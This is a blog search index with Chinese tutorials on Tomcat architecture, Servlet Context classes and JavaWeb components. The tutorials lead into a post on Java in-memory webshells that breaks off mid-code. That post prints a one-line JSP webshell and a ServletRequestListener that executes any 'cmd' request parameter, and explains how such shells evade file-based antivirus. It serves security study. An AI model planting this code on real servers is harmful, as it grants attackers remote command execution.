<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>tomcat架构</title>
      <link href="/2025/02/23/tomcat%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/02/23/tomcat%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h2><p><img src="/./../img/ma/Snipaste_2025-02-18_17-06-58.png" alt="Snipaste_2025-02-18_17-06-58"></p><p>可以看到Tomcat Server大致可以分为三个组件，Service、Connector、Container</p><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p><strong>Service</strong> 是 Tomcat 的一个主要组件，负责组织和管理 <strong>Connector</strong> 和 <strong>Container</strong> 的工作。一个 <strong>Service</strong> 可以包含多个 <strong>Connector</strong> 和 <strong>Container</strong>。它的作用是将所有相关的资源和功能组合在一起，确保 Tomcat 在处理请求时能够高效地协同工作。</p><h3 id="Connector（连接器）"><a href="#Connector（连接器）" class="headerlink" title="Connector（连接器）"></a>Connector（连接器）</h3><p><strong>Connector</strong> 负责接收来自客户端（如浏览器）的请求，并将这些请求传递给 <strong>Container</strong> 进行处理。它处理网络协议（如 HTTP、HTTPS）和客户端与服务器之间的连接。</p><h3 id="Container（容器）"><a href="#Container（容器）" class="headerlink" title="Container（容器）"></a><strong>Container（容器）</strong></h3><p><strong>Container</strong> 是 Tomcat 的核心，负责实际处理 HTTP 请求的业务逻辑。包含四种子容器：<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下</p><h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p><strong>Engine</strong> 是 <strong>Container</strong> 中的最顶层组件，负责处理所有的请求。它是 Tomcat 中的请求分发器，能够协调和管理所有的 <strong>Host</strong></p><h4 id="Host（主机）"><a href="#Host（主机）" class="headerlink" title="Host（主机）"></a>Host（主机）</h4><p><strong>Host</strong> 代表一个虚拟主机。一个 <strong>Host</strong> 通常对应一个域名或一个 IP 地址，它处理和管理特定的 Web 应用程序（通常对应于一个或多个网站）。每个 <strong>Host</strong> 可以包含多个 <strong>Context</strong>，每个 <strong>Context</strong> 对应一个 Web 应用。</p><h4 id="Context（上下文）"><a href="#Context（上下文）" class="headerlink" title="Context（上下文）"></a>Context（上下文）</h4><p><strong>Context</strong> 代表一个 Web 应用，是 Tomcat 中的一个应用级容器。一个 <strong>Context</strong> 通常对应一个单独的 Web 应用，它可以包含多个 Servlet、JSP 文件、HTML 页面等内容。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(&#x2F;)</p><p>下面找一个Tomcat的文件目录对照一下，如下图所示：</p><p><img src="/./../img/ma/Snipaste_2025-02-18_17-28-29.png" alt="Snipaste_2025-02-18_17-28-29"></p><p>Context和Host的区别是Context表示一个应用，我们的Tomcat中默认的配置下webapps下的每一个文件夹目录都是一个Context，其中ROOT目录中存放着主应用，其他目录存放着子应用，而整个webapps就是一个Host站点。</p><h4 id="Wrapper（封装器）"><a href="#Wrapper（封装器）" class="headerlink" title="Wrapper（封装器）"></a>Wrapper（封装器）</h4><p><strong>Wrapper</strong> 是 <strong>Container</strong> 中的一个组件，一个<strong>Container</strong> 可以对应多个wrapper。它负责封装一个 <strong>Servlet</strong>。每个 <strong>Wrapper</strong> 对应一个 Servlet，它管理该 Servlet 的生命周期（初始化、请求处理、销毁）。<strong>Wrapper</strong> 是 <strong>Context</strong> 中的一个重要组成部分，它决定了 <strong>Servlet</strong> 如何在 Tomcat 中被加载和执行。</p><p>可以用一张图来表示请求在Container中的解析过程</p><p><img src="/./../img/ma/image-20250218181420354.png" alt="image-20250218181420354"></p><p>当访问 <code>https://manage.xxx.com:8080/user/list</code> 时，Tomcat 会按照以下流程处理请求：</p><ol><li><strong>请求接收：</strong> 客户端通过 HTTPS 协议向 Tomcat 的 8080 端口发送请求。</li><li><strong>Connector 处理：</strong> Tomcat 的 <code>Connector</code> 组件接收请求，并将其转换为内部的 <code>Request</code> 对象。</li><li><strong>Engine 路由：</strong> <code>Engine</code> 组件根据请求的主机名（<code>manage.xxx.com</code>）确定目标 <code>Host</code>。</li><li><strong>Host 路由：</strong> <code>Host</code> 组件根据请求的路径（<code>/user/list</code>）确定目标 <code>Context</code>。</li><li><strong>Context 路由：</strong> <code>Context</code> 组件根据请求的路径确定目标 <code>Wrapper</code>。</li><li><strong>Wrapper 调用 Servlet：</strong> <code>Wrapper</code> 调用其封装的 <code>Servlet</code> 的 <code>service()</code> 方法，处理请求并生成响应。</li><li><strong>响应返回：</strong> 生成的响应通过上述层次返回给客户端。</li></ol>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三种Context的联系与区别</title>
      <link href="/2025/02/23/%E4%B8%89%E7%A7%8DContext%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/02/23/%E4%B8%89%E7%A7%8DContext%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="三种Context的联系与区别"><a href="#三种Context的联系与区别" class="headerlink" title="三种Context的联系与区别"></a>三种Context的联系与区别</h1><p>我们在分析和编写内存马的时候，总会涉及到ServletContext、ApplicationContext和StandardContext，下面我详细解释一下三者之间的联系和区别。</p><p>我们可以使用request.getServletContext()用于获取与当前 Servlet 相关联的 <code>ServletContext</code> 对象。</p><p><img src="/./../img/ma/image-20250220152416046.png" alt="image-20250220152416046"></p><h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a><strong>ServletContext</strong></h2><p>Servlet规范中定义的接口，代表Web应用的上下文环境。每个Web应用有且仅有一个ServletContext实例，用于全局资源共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package javax.servlet;</span><br><span class="line"></span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line">import java.util.EventListener;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Set;</span><br><span class="line">import javax.servlet.descriptor.JspConfigDescriptor;</span><br><span class="line"></span><br><span class="line">public interface ServletContext &#123;</span><br><span class="line"></span><br><span class="line">    public static final String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;;</span><br><span class="line">    public static final String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;;</span><br><span class="line"></span><br><span class="line">    public String getContextPath();</span><br><span class="line">    public ServletContext getContext(String uripath);</span><br><span class="line">    public int getMajorVersion();</span><br><span class="line">    public int getMinorVersion();</span><br><span class="line">    public int getEffectiveMajorVersion();</span><br><span class="line">    public int getEffectiveMinorVersion();</span><br><span class="line">    public String getMimeType(String file);</span><br><span class="line">    public Set&lt;String&gt; getResourcePaths(String path);</span><br><span class="line">    public URL getResource(String path) throws MalformedURLException;</span><br><span class="line">    public InputStream getResourceAsStream(String path);</span><br><span class="line">    public RequestDispatcher getRequestDispatcher(String path);</span><br><span class="line">    public RequestDispatcher getNamedDispatcher(String name);</span><br><span class="line">    @Deprecated</span><br><span class="line">    public Servlet getServlet(String name) throws ServletException;</span><br><span class="line">    @Deprecated</span><br><span class="line">    public Enumeration&lt;Servlet&gt; getServlets();</span><br><span class="line">    @Deprecated</span><br><span class="line">    public Enumeration&lt;String&gt; getServletNames();</span><br><span class="line">    public void log(String msg);</span><br><span class="line">    @Deprecated</span><br><span class="line">    public void log(Exception exception, String msg);</span><br><span class="line">    public void log(String message, Throwable throwable);</span><br><span class="line">    public String getRealPath(String path);</span><br><span class="line">    public String getServerInfo();</span><br><span class="line">    public String getInitParameter(String name);</span><br><span class="line">    public Enumeration&lt;String&gt; getInitParameterNames();</span><br><span class="line">    public boolean setInitParameter(String name, String value);</span><br><span class="line">    public Object getAttribute(String name);</span><br><span class="line">    public Enumeration&lt;String&gt; getAttributeNames();</span><br><span class="line">    public void setAttribute(String name, Object object);</span><br><span class="line">    public void removeAttribute(String name);</span><br><span class="line">    public String getServletContextName();</span><br><span class="line">    public ServletRegistration.Dynamic addServlet(String servletName, String className);</span><br><span class="line">    public ServletRegistration.Dynamic addServlet(String servletName, Servlet servlet);</span><br><span class="line">    public ServletRegistration.Dynamic addServlet(String servletName, Class&lt;? extends Servlet&gt; servletClass);</span><br><span class="line">    public ServletRegistration.Dynamic addJspFile(String servletName, String jspFile);</span><br><span class="line">    public &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; clazz) throws ServletException;</span><br><span class="line">    public ServletRegistration getServletRegistration(String servletName);</span><br><span class="line">    public Map&lt;String, ? extends ServletRegistration&gt; getServletRegistrations();</span><br><span class="line">    public FilterRegistration.Dynamic addFilter(String filterName, String className);</span><br><span class="line">    public FilterRegistration.Dynamic addFilter(String filterName, Filter filter);</span><br><span class="line">    public FilterRegistration.Dynamic addFilter(String filterName, Class&lt;? extends Filter&gt; filterClass);</span><br><span class="line">    public &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; clazz) throws ServletException;</span><br><span class="line">    public FilterRegistration getFilterRegistration(String filterName);</span><br><span class="line">    public Map&lt;String, ? extends FilterRegistration&gt; getFilterRegistrations();</span><br><span class="line">    public SessionCookieConfig getSessionCookieConfig();</span><br><span class="line">    public void setSessionTrackingModes(Set&lt;SessionTrackingMode&gt; sessionTrackingModes);</span><br><span class="line">    public Set&lt;SessionTrackingMode&gt; getDefaultSessionTrackingModes();</span><br><span class="line">    public Set&lt;SessionTrackingMode&gt; getEffectiveSessionTrackingModes();</span><br><span class="line">    public void addListener(String className);</span><br><span class="line">    public &lt;T extends EventListener&gt; void addListener(T t);</span><br><span class="line">    public void addListener(Class&lt;? extends EventListener&gt; listenerClass);</span><br><span class="line">    public &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; clazz) throws ServletException;</span><br><span class="line">    public JspConfigDescriptor getJspConfigDescriptor();</span><br><span class="line">    public ClassLoader getClassLoader();</span><br><span class="line">    public void declareRoles(String... roleNames);</span><br><span class="line">    public String getVirtualServerName();</span><br><span class="line">    public int getSessionTimeout();</span><br><span class="line">    public void setSessionTimeout(int sessionTimeout);</span><br><span class="line">    public String getRequestCharacterEncoding();</span><br><span class="line">    public void setRequestCharacterEncoding(String encoding);</span><br><span class="line">    public String getResponseCharacterEncoding();</span><br><span class="line">    public void setResponseCharacterEncoding(String encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到ServletContext接口里面提供了很多addFilter addServlet等方法对Web应用的各种资源和功能进行访问。</p><h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a><strong>ApplicationContext</strong></h2><p>ApplicationContext是Tomcat对<code>ServletContext</code>接口的具体实现类，其实现了ServletContext接口中定义的一些方法。</p><p>我们注意到request.getServletContext()实际上得到的是ApplicationContextFacade()，这是因为tomcat对<code>ApplicationContext</code>类进行了封装。</p><h2 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h2><p>StandardContext持有ApplicationContext实例，并通过后者提供ServletContext功能,也就是在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法。</p><p>我们通过研究 ApplicationContext的源码发现，ApplicationContext中的方法都是通过context调用</p><p><img src="/./../img/ma/image-20250220154408638.png" alt="image-20250220154408638"></p><p><img src="/./../img/ma/image-20250220154447064.png" alt="image-20250220154447064"></p><p>而context就是一个实例化的StandardContext对象。</p><p><img src="/./../img/ma/image-20250220154653601.png" alt="image-20250220154653601"></p><p><img src="/./../img/ma/image-20250220154727228.png" alt="image-20250220154727228"></p><p><img src="/./../img/ma/image-20250220154747024.png" alt="image-20250220154747024"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们用一张图来总结各context之间的关系</p><p><img src="/./../img/ma/image-20250220170507953.png" alt="image-20250220170507953"></p><p>StandardContext调用ApplicationContext来提供 ServletContext 相关功能，而ApplicationContextFacade封装ApplicationContext。</p>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb三大组件</title>
      <link href="/2025/02/23/JavaWeb%E7%BB%84%E4%BB%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/23/JavaWeb%E7%BB%84%E4%BB%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><p><strong>Servlet</strong> 是 Java Web 应用中的一个核心组件，负责处理客户端的请求，并生成响应。Servlet 是一个在服务器上运行的 Java 类，可以通过配置文件或注解与 URL 映射。Servlet 是 Java Web 应用的请求处理中心，处理逻辑通常在这里实现。</p><p><strong>加载和实例化</strong>：</p><ul><li>Servlet 被容器加载并实例化，通常是由配置文件（如 <code>web.xml</code>）或注解控制。</li></ul><p><strong>初始化</strong>：</p><ul><li>调用 <code>init()</code> 方法，Servlet 执行初始化操作。此方法在 Servlet 实例化时调用一次。</li></ul><p><strong>请求处理</strong>：</p><ul><li>每次客户端发起请求时，容器都会调用 <code>service()</code> 方法，<code>service()</code> 方法根据请求类型分发给相应的 <code>doGet()</code>、<code>doPost()</code> 等方法来处理请求。</li></ul><p><strong>销毁</strong>：</p><ul><li>当 Servlet 不再需要时，容器调用 <code>destroy()</code> 方法进行清理。通常在容器关闭或者 Servlet 被卸载时调用。</li></ul><p>[ Servlet 被加载 ] –&gt; [ 调用 init() 方法 ] –&gt; [ 调用 service() 方法 ] –&gt; [ 调用 destroy() 方法 ]</p><h4 id="Servlet使用示例"><a href="#Servlet使用示例" class="headerlink" title="Servlet使用示例"></a>Servlet使用示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/hello&quot;)  // 注解定义Servlet的URL映射</span><br><span class="line">public class HelloServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        // 设置响应内容类型</span><br><span class="line">        response.setContentType(&quot;text/html&quot;);</span><br><span class="line">        </span><br><span class="line">        // 获取输出流</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        </span><br><span class="line">        // 输出 HTML 内容</span><br><span class="line">        out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);</span><br><span class="line">        out.println(&quot;&lt;h1&gt;Hello, Java Web Servlet!&lt;/h1&gt;&quot;);</span><br><span class="line">        out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们使用注解来注册Servlet</p><p>当然也可以使用web.xml文件来注册Servlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee</span><br><span class="line">             http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span><br><span class="line">         version=&quot;3.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Filter（过滤器）"><a href="#Filter（过滤器）" class="headerlink" title="Filter（过滤器）"></a><strong>Filter（过滤器）</strong></h1><p><strong>Filter</strong> 用于在请求到达 Servlet 之前或响应返回客户端之前对请求和响应进行处理。<strong>Filter</strong> 可以用于日志记录、安全检查、请求数据修改、响应数据修改等功能。</p><p><img src="/./../img/ma/image-20250218182757170.png" alt="image-20250218182757170"></p><p>下面是一个简单的Filter Servlet示例，这里我们同样使用注解方式进行配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class MyFilter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        // 初始化代码</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line">        // 请求处理前</span><br><span class="line">        System.out.println(&quot;开始过滤前&quot;);</span><br><span class="line"></span><br><span class="line">        // 传递给下一个过滤器或 Servlet</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        // 响应处理后</span><br><span class="line">        System.out.println(&quot;过滤完毕&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        // 清理资源</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.example.MyFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;  &lt;!-- 过滤路径 --&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h2><p>一个servlet可以注册多个Filter，这样请求和响应经过多个Filter，形成FilterChain。并按照一定的顺序依次执行各Filter的doFilter()方法，这些Filterchail完全可以放在一个列表里执行。</p><p><img src="/./../img/ma/image-20250218190712719.png" alt="image-20250218190712719"></p><h1 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><p>Listener（监听器）是用于监听和响应特定事件的组件。它们可以感知并响应与应用程序相关的事件，从而执行相应的逻辑处理。例如，监听应用程序启动和关闭、会话创建和销毁、请求和响应的属性更改等事件。</p><p>按照监听的对象不同可以划分为三类</p><ul><li><p>ServletContextListener</p></li><li><p>HttpSessionListener</p></li><li><p>ServletRequestListener</p></li></ul><h1 id="三者的加载顺序"><a href="#三者的加载顺序" class="headerlink" title="三者的加载顺序"></a>三者的加载顺序</h1><p>无需多言，直接上图</p><p><img src="/./../img/ma/179803793a7e638f8c4b23ba3b6455f.png" alt="179803793a7e638f8c4b23ba3b6455f"></p>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存马(web传统型)详解</title>
      <link href="/2025/02/23/Java%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/02/23/Java%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>作为后来的学习者和探索者，我深知自己站在巨人的肩膀上。每一项技术的进步背后，都有无数前人的辛勤付出与深思熟虑。正是他们的努力，才为我提供了这片沃土，让我能够在这个基础上继续思考和前行。虽然这篇文章只能算作我在这个领域的一次小小尝试，但我更希望它能成为对前辈们探索精神的一种致敬，并为后续的师傅提供一些参考和启发。</p><p>环境：tomcat 9.0.68  java8  idea</p><p>在读这篇文章之前，建议了解下学习下前置知识</p><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><p>在普通的webshell攻击中，恶意代码通常存储在硬盘或外部设备上，以文件的形式存在（php、jsp），例如，以下是一个简单一句话木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">  System.out.println(process);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>在实战中，我们需要通过文件上传漏洞将webshell传到服务器。</p><p>传统的安全防护主要集中在文件系统层面，例如杀毒软件、文件监控、反病毒检测等，它们通过扫描硬盘上的恶意文件来发现和拦威胁，且传统的安全防护技术手段越来越成熟，导致现在的webshell容易被查杀</p><p>而Java内存马则不同，它将恶意代码直接加载到内存中运行。因为代码是直接在内存中执行的，它不需要保存到硬盘上，这使得它很难被传统的杀毒软件发现和检测。</p><h2 id="传统web应用内存马（Tomcat内存马）"><a href="#传统web应用内存马（Tomcat内存马）" class="headerlink" title="传统web应用内存马（Tomcat内存马）"></a>传统web应用内存马（Tomcat内存马）</h2><p>tomcat内存马主要有三个类型，Listener型、Filter型、Servlet，正好对应java web应用的三大组件，因此Tomcat内存马的实现原理是利用Java动态类加载和反射机制，动态注册恶意的Listener、Filter、Servlet或Valve等组件到Tomcat容器中，从而在内存中持久化恶意代码，实现隐蔽的攻击触发。</p><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p><code>Listener</code>是最先被加载的，根据前面内存马的实现思路，只要动态注册一个恶意的<code>Listener</code>，就又可以形成一种内存马了。在tomcat中Listener分为<code>ServletContextListener</code>、<code>HttpSessionListener</code>或<code>ServletRequestListener</code>，很明显<code>ServletRequestListener</code>是最适合做内存马的，因为访问任何服务就能触发操作。</p><h4 id="编写一个简单的ServletRequestListener"><a href="#编写一个简单的ServletRequestListener" class="headerlink" title="编写一个简单的ServletRequestListener"></a>编写一个简单的ServletRequestListener</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package com.example.listenshell;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletRequestEvent;</span><br><span class="line">import javax.servlet.ServletRequestListener;</span><br><span class="line">import javax.servlet.annotation.WebListener;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebListener</span><br><span class="line">public class Shell_Listener implements ServletRequestListener &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd = request.getParameter(&quot;cmd&quot;); // 从请求参数中获取命令</span><br><span class="line">        if (cmd != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd); // 执行命令</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace(); // 打印异常信息</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        // 这里可以添加请求销毁时的逻辑（如果需要）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/./../img/ma/image-20250222002830136.png" alt="image-20250222002830136"></p><h4 id="从代码层面分析Listener的创建流程"><a href="#从代码层面分析Listener的创建流程" class="headerlink" title="从代码层面分析Listener的创建流程"></a>从代码层面分析Listener的创建流程</h4><p>先来看一下调用栈</p><p><img src="/./../img/ma/image-20250220132736261.png" alt="image-20250220132736261"></p><p>查看StandardContext类的fireRequestInitEvent方法，可见fireRequestInitEvent()调用了我们Listener的requestInitialized()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 